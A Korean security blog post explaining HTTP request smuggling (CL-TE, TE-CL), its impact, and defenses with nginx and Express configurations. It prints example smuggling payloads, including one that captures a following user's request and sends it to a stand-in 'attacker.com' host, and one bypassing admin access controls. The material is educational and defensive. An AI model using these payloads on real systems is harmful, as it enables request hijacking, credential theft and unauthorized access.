---
title: "HTTP 요청 스머글링: 프록시 간 불일치 악용"
description: "프론트엔드 프록시와 백엔드 서버가 HTTP 요청 경계를 다르게 해석하는 불일치를 이용한 HTTP Request Smuggling 공격의 원리, CL-TE·TE-CL·TE-TE 변종과 방어 방법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-05"
archiveOrder: 10
type: "knowledge"
category: "Security"
tags: ["HTTPRequestSmuggling", "프록시보안", "HTTP보안", "보안취약점", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-redos/)에서 ReDoS 공격을 살펴봤다. 이번 글에서는 현대 웹 아키텍처에서 발생하는 정교한 공격인 **HTTP 요청 스머글링(HTTP Request Smuggling)** 을 다룬다. 이 공격은 2019년 James Kettle이 DEF CON에서 대규모로 재조명하면서 큰 주목을 받았다.

## HTTP 요청 스머글링이란?

현대 웹 서비스는 대부분 프론트엔드 프록시(Nginx, CDN, 로드 밸런서)와 백엔드 서버(Node.js, Java 등)의 이중 구조를 사용한다. HTTP 요청 스머글링은 두 서버가 동일한 HTTP 요청의 **경계(boundary)를 다르게 해석**할 때 발생한다.

## Content-Length vs Transfer-Encoding

HTTP/1.1은 요청 본문의 크기를 두 가지 방법으로 전달한다.

```http
# Content-Length: 본문의 바이트 수
Content-Length: 13

Hello, World!

# Transfer-Encoding: 청크(chunk) 단위 전송
Transfer-Encoding: chunked

d\r\n         ← 13 (hex) 바이트 크기
Hello, World!\r\n
0\r\n         ← 마지막 청크 (크기 0)
\r\n
```

두 헤더가 함께 있으면 어느 것을 우선할지에 대한 해석이 서버마다 다르다.

![HTTP 요청 스머글링 공격](/assets/posts/websec-http-request-smuggling-attack.svg)

## CL-TE 공격 (Content-Length 앞, Transfer-Encoding 뒤)

프론트엔드는 `Content-Length`를 사용하고 백엔드는 `Transfer-Encoding`을 사용한다.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```

- 프론트엔드: Content-Length=13이므로 `0\r\n\r\nGET /admin HTTP/1.1`까지 (13바이트) 를 하나의 요청으로 처리
- 백엔드: Transfer-Encoding을 따라 `0` (빈 청크 = 요청 종료)에서 첫 요청을 끝내고, `GET /admin HTTP/1.1` 을 **다음 요청의 시작**으로 처리

→ 공격자는 다음 사용자의 요청에 `/admin` 접근을 주입한다.

## TE-CL 공격 (Transfer-Encoding 앞, Content-Length 뒤)

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```

- 프론트엔드: Transfer-Encoding을 따라 전체를 하나의 요청으로 처리
- 백엔드: Content-Length=3이므로 `8\r\n` (3바이트)만 소비하고, `SMUGGLED\r\n0\r\n\r\n`을 다음 요청으로 처리

## 실제 영향

### 요청 하이재킹

```http
# 공격 요청 — 다음 사용자의 요청을 캡처
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: attacker.com
Content-Length: 1000

secret=
```

다음 사용자의 요청이 `POST /capture` 본문에 이어져 공격자 서버로 전송된다.

### 보안 메커니즘 우회

```http
# 프론트엔드의 접근 제어 우회
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin/users HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

프론트엔드는 `/admin` 접근을 차단하지만, 스머글된 요청은 백엔드에 직접 도달한다.

## 방어 전략

![HTTP 요청 스머글링 방어](/assets/posts/websec-http-request-smuggling-defense.svg)

### 1. HTTP/2 사용 (근본적 해결)

HTTP/2는 요청 경계가 프레임 레벨에서 명확히 정의되어 CL-TE 혼용 문제 자체가 없다.

```nginx
# nginx: HTTP/2 활성화
server {
    listen 443 ssl http2;

    # 백엔드와도 HTTP/2로 통신
    location / {
        grpc_pass grpcs://backend:50051;
        # 또는 HTTP/2 upstream 사용
    }
}
```

### 2. 백엔드로 HTTP/1.1만 사용 시 — 모호한 요청 거부

```nginx
# nginx: 두 헤더 동시 사용 요청 거부
server {
    # Transfer-Encoding과 Content-Length 동시 사용 거부
    if ($http_transfer_encoding ~* "chunked") {
        set $te_present 1;
    }
    if ($http_content_length) {
        set $cl_present 1;
    }
    if ($te_present$cl_present = 11) {
        return 400 "Ambiguous request";
    }
}
```

### 3. 청크 인코딩 비활성화

```nginx
# nginx upstream: 청크 인코딩 비활성화
upstream backend {
    server 127.0.0.1:8080;
    keepalive 32;
}

location / {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Connection "";
    # 청크 전송을 Content-Length로 변환
    chunked_transfer_encoding off;
}
```

### 4. 방어적 파싱 구현 (백엔드)

```javascript
// Express.js: 요청 크기 제한 및 검증
const express = require('express')
const app = express()

// 1. 요청 크기 제한
app.use(express.json({ limit: '10kb' }))
app.use(express.urlencoded({ extended: false, limit: '10kb' }))

// 2. 모호한 Transfer-Encoding 헤더 거부
app.use((req, res, next) => {
  const te = req.headers['transfer-encoding']
  if (te && te.toLowerCase() !== 'chunked') {
    return res.status(400).send('Unsupported Transfer-Encoding')
  }
  next()
})

// 3. 연결 재사용 제한 (스머글링 방지)
const server = app.listen(8080)
server.keepAliveTimeout = 5000  // 5초
server.headersTimeout = 6000
```

## 탐지 방법

```bash
# Burp Suite의 HTTP Request Smuggler 확장으로 자동 탐지
# 또는 smuggler.py 도구 사용

python3 smuggler.py -u https://target.com/

# 수동 테스트: 두 요청을 보내고 두 번째 요청이 영향 받는지 확인
```

## 핵심 원칙

HTTP 요청 스머글링은 하나의 취약점이 아니라 **서버 간 구성 불일치**에서 발생한다. 가장 효과적인 방어는 HTTP/2를 사용하거나, 프론트엔드와 백엔드 사이에 HTTP 파싱 규칙을 통일하는 것이다. 두 헤더가 충돌하는 요청은 즉시 거부해야 한다.

---

**지난 글:** [ReDoS: 정규표현식을 이용한 서비스 거부 공격](/posts/websec-redos/)

<br>
읽어주셔서 감사합니다. 😊
